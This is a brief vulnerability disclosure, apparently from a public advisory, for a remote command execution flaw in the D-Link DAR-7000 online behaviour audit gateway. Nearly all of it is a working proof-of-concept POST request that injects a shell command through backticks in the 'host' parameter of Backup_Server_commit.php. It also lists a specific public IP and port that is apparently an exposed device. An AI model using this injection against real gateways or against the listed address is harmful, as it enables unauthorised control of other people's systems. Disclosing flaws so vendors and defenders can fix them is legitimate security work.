The D-LINK DAR-7000 series online behavior audit gateway has a RCE vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/view/DBManage/Backup_Server_commit.php
221.193.248.37:9091

poc:
```
POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1
Host: 127.0.0.1
Cookie: 
Content-Length: 50
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close

host=`sleep${IFS}3`&mode=0&port=80&user=&password=
```
<img width="1019" alt="图片" src="https://github.com/user-attachments/assets/ec3ecb0e-d3a0-4814-a270-9d9eb196dc61">

